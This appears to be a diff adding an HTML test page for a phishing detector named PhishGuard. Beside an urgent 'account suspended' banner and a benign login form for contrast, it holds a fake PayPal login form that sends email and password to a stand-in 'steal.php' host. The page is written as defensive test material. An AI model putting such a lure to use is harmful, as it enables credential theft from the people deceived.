@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PhishGuard Test</title>
+</head>
+<body>
+<h1>PhishGuard Test Page</h1>
+
+<div style="background: #ffebee; padding: 20px; margin: 20px 0; border: 2px solid red;">
+<h2>URGENT: Your Account Suspended!</h2>
+<p>Your account has been suspended due to unusual activity.</p>
+<p>Please verify your identity immediately or your account will be permanently closed.</p>
+</div>
+
+<div style="background: #e3f2fd; padding: 20px; margin: 20px 0;">
+<h2>PayPal Login</h2>
+<p>Please log in to your PayPal account to verify your information.</p>
+<form action="http://192.168.1.100/steal.php" method="GET">
+<p>Email: <input type="email" name="email"></p>
+<p>Password: <input type="password" name="password"></p>
+<p><button type="submit">Log In to PayPal</button></p>
+</form>
+</div>
+
+<div style="background: #e8f5e9; padding: 20px; margin: 20px 0;">
+<h2>Safe Form Example</h2>
+<p>This is a legitimate form (POST method, HTTPS):</p>
+<form action="https://example.com/login" method="POST">
+<p>Username: <input type="text" name="username"></p>
+<p>Password: <input type="password" name="password"></p>
+<p><button type="submit">Login</button></p>
+</form>
+</div>
+
+<p>Open browser console (F12) to see PhishGuard analysis.</p>
+</body>
+</html>
